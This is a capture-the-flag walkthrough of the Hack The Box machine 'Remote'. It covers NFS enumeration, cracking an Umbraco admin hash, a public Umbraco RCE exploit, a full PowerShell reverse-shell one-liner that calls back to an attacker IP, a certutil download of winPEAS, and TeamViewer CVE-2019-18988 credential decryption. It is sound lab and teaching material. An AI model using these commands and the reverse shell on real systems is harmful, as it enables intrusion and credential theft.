# Remote - Easy

```sh
sudo vim /etc/hosts
# add remote.htb

nmap -T4 -p- -A -Pn -v remote.htb
```

* open ports & services:

    * 21/tcp - ftp - Microsoft ftpd
    * 80/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 111/tcp - rpcbind - 2-4
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 445/tcp - microsoft-ds
    * 2049/tcp - nlockmgr - 1-4
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 47001/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 49664-49680/tcp - msrpc - Microsoft Windows RPC

* enumerating FTP:

    ```sh
    ftp anonymous@remote.htb
    # anonymous mode is allowed

    dir
    # this does not show anything
    # we simply get the messages "Entering Extended Passive Mode" and "Data connection already open; Transfer starting"
    
    passive off

    dir
    # still the same messages

    passive
    # turn passive mode off

    dir
    # "EPRT command successful" but no directory listing

    exit
    ```

* checking the webpage on port 80, it is a page for 'Acme Widgets' and includes some sub-sections for products, blogs, etc.

* most of the pages do not contain anything significant; the '/contact' page mentions 'Umbraco Forms', and provides a link to '/umbraco'

* Google shows that Umbraco is a .NET CMS, and this website is running on it

* web scan:

    ```sh
    gobuster dir -u http://remote.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # dir scan
    ```

* ```gobuster``` confirms that the website is using '.aspx' pages, and finds additional pages but they do not give any info

* checking the '/umbraco' page leads to a login form at 'http://remote.htb/umbraco/#/login'

* the version is not disclosed anywhere, and attempting default creds for Umbraco does not help - we can continue checking other services for clues

* enumerating RPC & SMB:

    ```sh
    rpcinfo -p remote.htb
    # lists all RPC services

    rpcclient -U "" remote.htb
    # NT_STATUS_LOGON_FAILURE

    smbclient -N -L //remote.htb
    # NT_STATUS_ACCESS_DENIED

    sudo crackmapexec smb remote.htb --shares -u '' -p ''
    # STATUS_ACCESS_DENIED

    sudo crackmapexec smb remote.htb --shares -u 'Guest' -p ''
    # STATUS_ACCOUNT_DISABLED

    smbmap -H remote.htb
    ```

* the RPC services listed (with protocol & port) include - portmapper, nfs, mountd, nlockmgr, and status - but no other info is found

* on port 2049, ```nlockmgr``` is running - this service works with NFS (which runs on port 2049 usually) and is a lock manager for files

* enumerating NFS:

    ```sh
    showmount -e remote.htb
    # this shows '/site_backups'

    sudo mkdir /mnt/backups
    # create target folder for mounting

    sudo mount -t nfs remote.htb:/site_backups /mnt/backups -o nolock
    # mount the '/site_backups' folder

    cd /mnt/backups
    # enumerate all the site backup files

    cat Web.config

    cd App_Data

    file Umbraco.sdf
    # binary file

    cp Umbraco.sdf ~/remote
    # copy for further investigation

    sudo umount /mnt/backups
    # unmount once done
    ```

* from the 'site_backups' folder found via NFS, we get a few files of importance

* the 'Web.config' file discloses the Umbraco version as 7.12.4

* also, Googling for Umbraco credential files shows that user or DB creds are usually stored in 'Web.config' or 'App_Data/Umbraco.sdf'

* we can open this '.sdf' file using ```sqlitebrowser```, but it is password-protected

* also, Googling for vulnerabilities related to Umbraco 7.12.4 gives us multiple RCE exploits - but these are authenticated, so we need to find for creds in the 'Umbraco.sdf' file

* we do not have a tool to crack '.sdf' files, so we can attempt to ```grep``` for password strings in this file:

    ```sh
    grep -ai 'pass' Umbraco.sdf
    # -a to show matches in binary file
    # -i to ignore case

    strings Umbraco.sdf
    ```

* using ```grep```, we can see usernames 'admin' ("admin@htb.local") and 'ssmith' ("smith@htb.local")

* ```strings``` shows a lot of output, but the initial output includes 'SHA1' hash for 'admin' & 'HMACSHA256' hash for 'ssmith' - it is not separated by spaces, but concatenated to the usernames, so we can copy it and verify the format to ensure it is correctly copied

* we can attempt to crack the SHA1 hash for 'admin' user:

    ```sh
    vim sha1hash.txt

    hashcat -a 0 -m 100 sha1hash.txt /usr/share/wordlists/rockyou.txt --force
    # -m 100 for SHA1
    ```

* ```hashcat``` cracks the hash to give plaintext 'baconandcheese'

* we can now attempt the [exploit for Umbraco 7.12.4 RCE](https://github.com/noraj/Umbraco-RCE):

    ```sh
    python3 exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c whoami
    # RCE works

    nc -nvlp 4444
    # setup listener

    # for reverse shell, we can use an encoded PowerShell one-liner
    pwsh

    $Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.21",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

    $EncodedText =[Convert]::ToBase64String($Bytes)

    $EncodedText
    # base64-encoded reverse shell one-liner

    exit

    python3 exploit.py -u admin@htb.local -p baconandcheese -i http://remote.htb -c powershell.exe -a 'powershell -enc <encoded-one-liner>'
    # following the RCE example given in the exploit
    # this works
    ```

    ```ps
    # in reverse shell
    
    whoami
    # iis apppool\defaultapppool

    gci C:\
    # enumerate folders

    gci -force C:\ftp_transfer
    # no files found

    gci C:\Users
    # we do not have a standard user

    # search for user flag

    gci C:\Users\Public\Desktop
    # this contains user flag, and a shortcut for TeamViewer

    type C:\Users\Public\Desktop\user.txt
    ```

* we can do basic enumeration using ```winpeas```:

    ```ps
    cd C:\Users\Public

    # fetch script from attacker

    certutil -urlcache -f http://10.10.14.21:8000/winPEASx64.exe winpeas.exe

    .\winpeas.exe
    ```

* findings from ```winpeas```:

    * Windows Server 2019 Standard, version 1809
    * no AV detected
    * AutoLogon creds found for 'Administrator'
    * port 5939 running 'TeamViewer_Service' internally

* checking for AutoLogon creds does not give anything:

    ```ps
    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    ```

* we can check the apps installed on the box to get some info about the TeamViewer service:

    ```ps
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname, displayversion
    # list all 32-bit installed apps

    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname, displayversion
    # list all 64-bit installed apps
    ```

* the list of 32-bit apps includes 'TeamViewer 7', version 7.0.43148 - we can check more info about it:

    ```ps
    wmic service list brief | findstr "Team"
    # get service name and status - it is running

    wmic service get name,displayname,pathname,startmode | findstr "TeamViewer7"
    # provides exe path
    # startmode is 'auto'
    ```

* Googling for exploits associated with this version gives multiple exploits as it's an older release of TeamViewer

* one exploit CVE-2019-18988 stands out - it is a local credential disclosure exploit so we can try it first

* we can follow the [commands for reference to query the registry](https://github.com/mr-r3b00t/CVE-2019-18988):

    ```ps
    reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version
    # confirm version

    # check all reg queries

    reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
    # this works
    ```

* the registry query discloses AES keys for 'admin' in the 'SecurityPasswordAES' field - we can now crack this using the [CyberChef](https://gchq.github.io/CyberChef) recipe given in the exploit details:

    * AES decrypt -

        * key - 0602000000a400005253413100040000 - hex
        * IV - 0100010067244F436E6762F25EA8D704 - hex
        * mode - CBC
        * input - hex
        * output - raw
    
    * decode text - UTF-16LE (1200)
    
    * remove null bytes

* decrypting the AES text gives us plaintext '!R3m0te!' - we can use this to login as Administrator now:

    ```sh
    evil-winrm -u Administrator -p '!R3m0te!' -i remote.htb

    type C:\Users\Administrator\Desktop\root.txt
    # root flag
    ```
